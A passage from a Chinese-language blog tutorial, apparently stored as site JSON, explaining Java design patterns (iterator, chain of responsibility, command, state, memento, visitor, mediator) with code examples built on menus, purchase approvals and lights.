Breakfast&quot;,&quot;boiled eggs&amp;toast&amp;cabbage&quot;,true,3.99f); addItem(&quot;MDL Cake Breakfast&quot;,&quot;fried eggs&amp;toast&quot;,false,3.59f); addItem(&quot;Stawberry Cake&quot;,&quot;fresh stawberry&quot;,true,3.29f); addItem(&quot;Regular Cake Breakfast&quot;,&quot;toast&amp;sausage&quot;,true,2.59f); } private void addItem(String name, String description, boolean vegetable, float price) { MenuItem menuItem = new MenuItem(name, description, vegetable, price); menuItems.add(menuItem); } public Iterator getIterator() { return new CakeHouseIterator() ; } class CakeHouseIterator implements Iterator { private int position=0; public CakeHouseIterator() { position=0; } @Override public boolean hasNext() { // TODO Auto-generated method stub if(position&lt;menuItems.size()) { return true; } return false; } @Override public Object next() { // TODO Auto-generated method stub MenuItem menuItem =menuItems.get(position); position++; return menuItem; }}; //鍏朵粬鍔熻兘浠ｇ爜 } 3 中餐厅菜单和中餐厅菜单遍历器 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556public class DinerMenu { private final static int Max_Items = 5; private int numberOfItems = 0; private MenuItem[] menuItems; public DinerMenu() { menuItems = new MenuItem[Max_Items]; addItem(&quot;vegetable Blt&quot;, &quot;bacon&amp;lettuce&amp;tomato&amp;cabbage&quot;, true, 3.58f); addItem(&quot;Blt&quot;, &quot;bacon&amp;lettuce&amp;tomato&quot;, false, 3.00f); addItem(&quot;bean soup&quot;, &quot;bean&amp;potato salad&quot;, true, 3.28f); addItem(&quot;hotdog&quot;, &quot;onions&amp;cheese&amp;bread&quot;, false, 3.05f); } private void addItem(String name, String description, boolean vegetable, float price) { MenuItem menuItem = new MenuItem(name, description, vegetable, price); if (numberOfItems &gt;= Max_Items) { System.err.println(&quot;sorry,menu is full!can not add another item&quot;); } else { menuItems[numberOfItems] = menuItem; numberOfItems++; } } public Iterator getIterator() { return new DinerIterator(); } class DinerIterator implements Iterator { private int position; public DinerIterator() { position = 0; } @Override public boolean hasNext() { // TODO Auto-generated method stub if (position &lt; numberOfItems) { return true; } return false; } @Override public Object next() { // TODO Auto-generated method stub MenuItem menuItem = menuItems[position]; position++; return menuItem; } };} 4 女服务员 1234567891011121314151617181920212223242526272829303132333435363738394041public class Waitress { private ArrayList&lt;Iterator&gt; iterators = new ArrayList&lt;Iterator&gt;(); public Waitress() { } public void addIterator(Iterator iterator) { iterators.add(iterator); } public void printMenu() { Iterator iterator; MenuItem menuItem; for (int i = 0, len = iterators.size(); i &lt; len; i++) { iterator = iterators.get(i); while (iterator.hasNext()) { menuItem = (MenuItem) iterator.next(); System.out .println(menuItem.getName() + &quot;***&quot; + menuItem.getPrice() + &quot;***&quot; + menuItem.getDescription()); } } } public void printBreakfastMenu() { } public void printLunchMenu() { } public void printVegetableMenu() { }} # 16 责任链模式 ** 定义：** 如果有多个对象有机会处理请求，责任链可使请求的发送者和接受者解耦，请求沿着责任链传递，直到有一个对象处理了它为止。 ** 主要解决：** 职责链上的处理者负责处理请求，客户只需要将请求发送到职责链上即可，无须关心请求的处理细节和请求的传递，所以职责链将请求的发送者和请求的处理者解耦了。 ** 何时使用：** 在处理消息的时候以过滤很多道。 ** 如何解决：** 拦截的类都实现统一接口。 ** 关键代码：**Handler 里面聚合它自己，在 HandlerRequest 里判断是否合适，如果没达到条件则向下传递，向谁传递之前 set 进去。 # 16.1 模式的结构和代码示例 抽象处理者（Handler）角色：定义一个处理请求的接口，包含抽象处理方法和一个后继连接。 具体处理者（Concrete Handler）角色：实现抽象处理者的处理方法，判断能否处理本次请求，如果可以处理请求则处理，否则将该请求转给它的后继者。 客户类（Client）角色：创建处理链，并向链头的具体处理者对象提交请求，它不关心处理细节和请求的传递过程。 举例（购买请求决策，价格不同要由不同的级别决定：组长、部长、副部、总裁）。类图如下： 1 决策者抽象类，包含对请求处理的函数，同时还包含指定下一个决策者的函数 12345678910111213public abstract class Approver { Approver successor; String Name; public Approver(String Name) { this.Name=Name; } public abstract void ProcessRequest( PurchaseRequest request); public void SetSuccessor(Approver successor) { // TODO Auto-generated method stub this.successor=successor; }} 2 客户端以及请求 1234567891011121314151617181920212223242526272829303132333435public class PurchaseRequest { private int Type = 0; private int Number = 0; private float Price = 0; private int ID = 0; public PurchaseRequest(int Type, int Number, float Price) { this.Type = Type; this.Number = Number; this.Price = Price; } public int GetType() { return Type; } public float GetSum() { return Number * Price; } public int GetID() { return (int) (Math.random() * 1000); }}public class Client { public Client() { } public PurchaseRequest sendRequst(int Type, int Number, float Price) { return new PurchaseRequest(Type, Number, Price); }} 3 组长、部长。。。继承决策者抽象类 1234567891011121314151617181920212223242526272829303132333435363738394041public class GroupApprover extends Approver { public GroupApprover(String Name) { super(Name + &quot; GroupLeader&quot;); // TODO Auto-generated constructor stub } @Override public void ProcessRequest(PurchaseRequest request) { // TODO Auto-generated method stub if (request.GetSum() &lt; 5000) { System.out.println(&quot;**This request &quot; + request.GetID() + &quot; will be handled by &quot; + this.Name + &quot; **&quot;); } else { successor.ProcessRequest(request); } }}public class DepartmentApprover extends Approver { public DepartmentApprover(String Name) { super(Name + &quot; DepartmentLeader&quot;); } @Override public void ProcessRequest(PurchaseRequest request) { // TODO Auto-generated method stub if ((5000 &lt;= request.GetSum()) &amp;&amp; (request.GetSum() &lt; 10000)) { System.out.println(&quot;**This request &quot; + request.GetID() + &quot; will be handled by &quot; + this.Name + &quot; **&quot;); } else { successor.ProcessRequest(request); } }} 4 测试 1234567891011121314151617181920public class MainTest { public static void main(String[] args) { Client mClient = new Client(); Approver GroupLeader = new GroupApprover(&quot;Tom&quot;); Approver DepartmentLeader = new DepartmentApprover(&quot;Jerry&quot;); Approver VicePresident = new VicePresidentApprover(&quot;Kate&quot;); Approver President = new PresidentApprover(&quot;Bush&quot;); GroupLeader.SetSuccessor(VicePresident); DepartmentLeader.SetSuccessor(President); VicePresident.SetSuccessor(DepartmentLeader); President.SetSuccessor(GroupLeader); GroupLeader.ProcessRequest(mClient.sendRequst(1, 10000, 40)); }} # # 17 命令模式 ** 定义：** 将一个请求封装为一个对象，使发出请求的责任和执行请求的责任分割开。这样两者之间通过命令对象进行沟通，这样方便将命令对象进行储存、传递、调用、增加与管理。 ** 意图：** 将一个请求封装成一个对象，从而使您可以用不同的请求对客户进行参数化。 ** 主要解决：** 在软件系统中，行为请求者与行为实现者通常是一种紧耦合的关系，但某些场合，比如需要对行为进行记录、撤销或重做、事务等处理时，这种无法抵御变化的紧耦合的设计就不太合适。 ** 何时使用：** 在某些场合，比如要对行为进行 &quot;记录、撤销 / 重做、事务&quot; 等处理，这种无法抵御变化的紧耦合是不合适的。在这种情况下，如何将 &quot;行为请求者&quot; 与 &quot;行为实现者&quot; 解耦？将一组行为抽象为对象，可以实现二者之间的松耦合。 ** 如何解决：** 通过调用者调用接受者执行命令，顺序：调用者→接受者→命令。 # 17.1 模式结构和代码示例 # 抽象命令类（Command）角色：声明执行命令的接口，拥有执行命令的抽象方法 execute ()。 具体命令角色（Concrete Command）角色：是抽象命令类的具体实现类，它拥有接收者对象，并通过调用接收者的功能来完成命令要执行的操作。 实现者 / 接收者（Receiver）角色：执行命令功能的相关操作，是具体命令对象业务的真正实现者。 调用者 / 请求者（Invoker）角色：是请求的发送者，它通常拥有很多的命令对象，并通过访问命令对象来执行相关请求，它不直接访问接收者。 代码举例（开灯和关灯），类图如下： 1 命令抽象类 123456public interface Command { public void excute(); public void undo();} 2 具体命令对象 123456789101112131415161718192021public class TurnOffLight implements Command { private Light light; public TurnOffLight(Light light) { this.light = light; } @Override public void excute() { // TODO Auto-generated method stub light.Off(); } @Override public void undo() { // TODO Auto-generated method stub light.On(); }} 3 实现者 12345678910111213141516171819public class Light { String loc = &quot;&quot;; public Light(String loc) { this.loc = loc; } public void On() { System.out.println(loc + &quot; On&quot;); } public void Off() { System.out.println(loc + &quot; Off&quot;); }} 4 请求者 12345678910111213public class Contral{ public void CommandExcute(Command command) { // TODO Auto-generated method stub command.excute(); } public void CommandUndo(Command command) { // TODO Auto-generated method stub command.undo(); }} # # 18 状态模式 定义： 在状态模式中，我们创建表示各种状态的对象和一个行为随着状态对象改变而改变的 context 对象。 简单理解，一个拥有状态的 context 对象，在不同的状态下，其行为会发生改变。 ** 意图：** 允许对象在内部状态发生改变时改变它的行为，对象看起来好像修改了它的类。 ** 主要解决：** 对象的行为依赖于它的状态（属性），并且可以根据它的状态改变而改变它的相关行为。 ** 何时使用：** 代码中包含大量与对象状态有关的条件语句。 ** 如何解决：** 将各种具体的状态类抽象出来。 ** 关键代码：** 通常命令模式的接口中只有一个方法。而状态模式的接口中有一个或者多个方法。而且，状态模式的实现类的方法，一般返回值，或者是改变实例变量的值。也就是说，状态模式一般和对象的状态有关。实现类的方法有不同的功能，覆盖接口中的方法。状态模式和命令模式一样，也可以用于消除 if…else 等条件选择语句。 优点： 1、封装了转换规则。 2、枚举可能的状态，在枚举状态之前需要确定状态种类。 3、将所有与某个状态有关的行为放到一个类中，并且可以方便地增加新的状态，只需要改变对象状态即可改变对象的行为。 4、允许状态转换逻辑与状态对象合成一体，而不是某一个巨大的条件语句块。 5、可以让多个环境对象共享一个状态对象，从而减少系统中对象的个数。 缺点： 1、状态模式的使用必然会增加系统类和对象的个数。 2、状态模式的结构与实现都较为复杂，如果使用不当将导致程序结构和代码的混乱。 3、状态模式对 &quot;开闭原则&quot; 的支持并不太好，对于可以切换状态的状态模式，增加新的状态类需要修改那些负责状态转换的源代码，否则无法切换到新增状态，而且修改某个状态类的行为也需修改对应类的源代码。 # 18.1 模式结构和代码示例 State 抽象状态角色 接口或抽象类，负责对象状态定义，并且封装环境角色以实现状态切换。 ConcreteState 具体状态角色 具体状态主要有两个职责：一是处理本状态下的事情，二是从本状态如何过渡到其他状态。 Context 环境角色 定义客户端需要的接口，并且负责具体状态的切换。 举例（人物在地点 A 向地点 B 移动，在地点 B 向地点 A 移动）。类图如下： 1 state 接口 12345public interface State { public void stop(); public void move();} 2 状态实例 12345678910111213141516171819202122232425public class PlaceA implements State { private Player context; public PlaceA(Player context) { this.context = context; } @Override public void move() { System.out.println(&quot;处于地点A,开始向B移动&quot;); System.out.println(&quot;--------&quot;); context.setDirection(&quot;AB&quot;); context.setState(context.onMove); } @Override public void stop() { // TODO Auto-generated method stub System.out.println(&quot;正处在地点A，不用停止移动&quot;); System.out.println(&quot;--------&quot;); }} 3 context (player) 拥有状态的对象 12345678910111213141516171819202122232425262728293031323334353637383940414243public class Player { State placeA; State placeB; State onMove; private State state; private String direction; public Player() { direction = &quot;AB&quot;; placeA = new PlaceA(this); placeB = new PlaceB(this); onMove = new OnMove(this); this.state = placeA; } public void move() { System.out.println(&quot;指令:开始移动&quot;); state.move(); } public void stop() { System.out.println(&quot;指令:停止移动&quot;); state.stop(); } public State getState() { return state; } public void setState(State state) { this.state = state; } public void setDirection(String direction) { this.direction = direction; } public String getDirection() { return direction; }} # # 19 备忘录模式 定义： 在不破坏封装性的前提下，捕获一个对象的内部状态，并在该对象之外保存这个状态，以便以后当需要时能将该对象恢复到原先保存的状态。该模式又叫快照模式。 备忘录模式是一种对象行为型模式，其主要优点如下。 提供了一种可以恢复状态的机制。当用户需要时能够比较方便地将数据恢复到某个历史的状态。 实现了内部状态的封装。除了创建它的发起人之外，其他对象都不能够访问这些状态信息。 简化了发起人类。发起人不需要管理和保存其内部状态的各个备份，所有状态信息都保存在备忘录中，并由管理者进行管理，这符合单一职责原则。 其主要缺点是：资源消耗大。如果要保存的内部状态信息过多或者特别频繁，将会占用比较大的内存资源。 # 19.1 模式结构图和代码示例 发起人（Originator）角色：记录当前时刻的内部状态信息，提供创建备忘录和恢复备忘录数据的功能，实现其他业务功能，它可以访问备忘录里的所有信息。 备忘录（Memento）角色：负责存储发起人的内部状态，在需要的时候提供这些内部状态给发起人。 管理者（Caretaker）角色：对备忘录进行管理，提供保存与获取备忘录的功能，但其不能对备忘录的内容进行访问与修改。 举例（发起者通过备忘录存储信息和获取信息），类图如下： 1 备忘录接口 123public interface MementoIF {} 2 备忘录 1234567891011121314public class Memento implements MementoIF{ private String state; public Memento(String state) { this.state = state; } public String getState(){ return state; } } 3 发起者 123456789101112131415161718192021public class Originator { private String state; public String getState() { return state; } public void setState(String state) { this.state = state; } public Memento saveToMemento() { return new Memento(state); } public String getStateFromMemento(MementoIF memento) { return ((Memento) memento).getState(); }} 4 管理者 12345678910111213public class CareTaker { private List&lt;MementoIF&gt; mementoList = new ArrayList&lt;MementoIF&gt;(); public void add(MementoIF memento) { mementoList.add(memento); } public MementoIF get(int index) { return mementoList.get(index); }} # 20 访问者模式 ** 定义：** 将作用于某种数据结构中的各元素的操作分离出来封装成独立的类，使其在不改变数据结构的前提下可以添加作用于这些元素的新的操作，为数据结构中的每个元素提供多种访问方式。它将对数据的操作与数据结构进行分离。 访问者（Visitor）模式是一种对象行为型模式，其主要优点如下。 扩展性好。能够在不修改对象结构中的元素的情况下，为对象结构中的元素添加新的功能。 复用性好。可以通过访问者来定义整个对象结构通用的功能，从而提高系统的复用程度。 灵活性好。访问者模式将数据结构与作用于结构上的操作解耦，使得操作集合可相对自由地演化而不影响系统的数据结构。 符合单一职责原则。访问者模式把相关的行为封装在一起，构成一个访问者，使每一个访问者的功能都比较单一。 访问者（Visitor）模式的主要缺点如下。 增加新的元素类很困难。在访问者模式中，每增加一个新的元素类，都要在每一个具体访问者类中增加相应的具体操作，这违背了 “开闭原则”。 破坏封装。访问者模式中具体元素对访问者公布细节，这破坏了对象的封装性。 违反了依赖倒置原则。访问者模式依赖了具体类，而没有依赖抽象类。 # 20.1 模式结构和代码示例 访问者模式包含以下主要角色。 抽象访问者（Visitor）角色：定义一个访问具体元素的接口，为每个具体元素类对应一个访问操作 visit () ，该操作中的参数类型标识了被访问的具体元素。 具体访问者（ConcreteVisitor）角色：实现抽象访问者角色中声明的各个访问操作，确定访问者访问一个元素时该做什么。 抽象元素（Element）角色：声明一个包含接受操作 accept () 的接口，被接受的访问者对象作为 accept () 方法的参数。 具体元素（ConcreteElement）角色：实现抽象元素角色提供的 accept () 操作，其方法体通常都是 visitor.visit (this) ，另外具体元素中可能还包含本身业务逻辑的相关操作。 对象结构（Object Structure）角色：是一个包含元素角色的容器，提供让访问者对象遍历容器中的所有元素的方法，通常由 List、Set、Map 等聚合类实现。 1 抽象访问者 1234public interface Visitor { abstract public void Visit(Element element);} 2 具体访问者 123456789101112public class CompensationVisitor implements Visitor { @Override public void Visit(Element element) { // TODO Auto-generated method stub Employee employee = ((Employee) element); System.out.println( employee.getName() + &quot;'s Compensation is &quot; + (employee.getDegree() * employee.getVacationDays() * 10)); }} 3 抽象元素 1234public interface Element { abstract public void Accept(Visitor visitor);} 4 具体元素 123456789101112public class CompensationVisitor implements Visitor { @Override public void Visit(Element element) { // TODO Auto-generated method stub Employee employee = ((Employee) element); System.out.println( employee.getName() + &quot;'s Compensation is &quot; + (employee.getDegree() * employee.getVacationDays() * 10)); }} 5 对象结构 1234567891011121314151617181920212223242526public class ObjectStructure { private HashMap&lt;String, Employee&gt; employees; public ObjectStructure() { employees = new HashMap(); } public void Attach(Employee employee) { employees.put(employee.getName(), employee); } public void Detach(Employee employee) { employees.remove(employee); } public Employee getEmployee(String name) { return employees.get(name); } public void Accept(Visitor visitor) { for (Employee e : employees.values()) { e.Accept(visitor); } }} # # 21 中介者模式 ** 定义：** 定义一个中介对象来封装一系列对象之间的交互，使原有对象之间的耦合松散，且可以独立地改变它们之间的交互。中介者模式又叫调停模式，它是迪米特法则的典型应用。 中介者模式是一种对象行为型模式，其主要优点如下。 降低了对象之间的耦合性，使得对象易于独立地被复用。 将对象间的一对多关联转变为一对一的关联，提高系统的灵活性，使得系统易于维护和扩展。 其主要缺点是：当同事类太多时，中介者的职责将很大，它会变得复杂而庞大，以至于系统难以维护。 # 21.1 模式结构和代码示例 抽象中介者（Mediator）角色：它是中介者的接口，提供了同事对象注册与转发同事对象信息的抽象方法。 具体中介者（ConcreteMediator）角色：实现中介者接口，定义一个 List 来管理同事对象，协调各个同事角色之间的交互关系，因此它依赖于同事角色。 抽象同事类（Colleague）角色：定义同事类的接口，保存中介者对象，提供同事对象交互的抽象方法，实现所有相互影响的同事类的公共功能。 具体同事类（Concrete Colleague）角色：是抽象同事类的实现者，当需要与其他同事对象交互时，由中介者对象负责后续的交互。 举例（通过中介卖方），类图如下： 1 抽象中介者 1234567public interface Mediator { void register(Colleague colleague); // 客户注册 void relay(String from, String to,String ad); // 转发} 2 具体中介者 12345678910111213141516171819202122232425262728public class ConcreteMediator implements Mediator { private List&lt;Colleague&gt; colleagues = new ArrayList&lt;Colleague&gt;(); @Override public void register(Colleague colleague) { // TODO Auto-generated method stub if (!colleagues.contains(colleague)) { colleagues.add(colleague); colleague.setMedium(this); } } @Override public void relay(String from, String to, String ad) { // TODO Auto-generated method stub for (Colleague cl : colleagues) { String name = cl.getName(); if (name.equals(to)) { cl.receive(from, ad); } } }} 3 抽象同事类 123456789101112131415161718192021222324public abstract class Colleague { protected Mediator mediator; protected String name; public Colleague(String name) { this.name = name; } public void setMedium(Mediator mediator) { this.mediator = mediator; } public String getName() { return name; } public abstract void Send(String to, String ad); public abstract void receive(String from, String ad);} 4 具体同事类 123456789101112131415161718192021public class Buyer extends Colleague { public Buyer(String name) { super(name); } @Override public void Send(String to, String ad) { // TODO Auto-generated method stub mediator.relay(name, to, ad); } @Override public void receive(String from, String ad) { // TODO Auto-generated method stub System.out.println(name + &quot;接收到来自&quot; + from + &quot;的消息:&quot; + ad); }} # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2023/04/29/%E3%80%90%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E3%80%9123%20%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%AF%A6%E8%A7%A3%EF%BC%88%E5%85%A823%E7%A7%8D%EF%BC%89/"}],"tags":[],"categories":[],"pages":[{"title":"about","text":"","link":"/about/index.html"}]}